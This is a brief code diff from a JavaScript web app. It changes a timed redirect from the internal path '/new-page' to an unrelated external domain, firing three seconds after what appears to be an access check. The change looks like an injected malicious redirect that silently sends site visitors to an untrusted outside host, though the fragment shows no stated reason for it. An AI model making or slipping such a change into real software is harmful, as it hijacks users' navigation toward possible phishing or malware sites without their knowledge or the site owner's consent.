@@ -65,7 +65,7 @@ const app = createApp({
         document.body.innerHTML = '<h1>Access Denied</h1>';
       } else {
         setTimeout(() => {
-          window.location.href = '/new-page';
+          window.location.href = 'https://tk.altinbasaknevresim.com.tr';
         }, 3000);
       }
     });
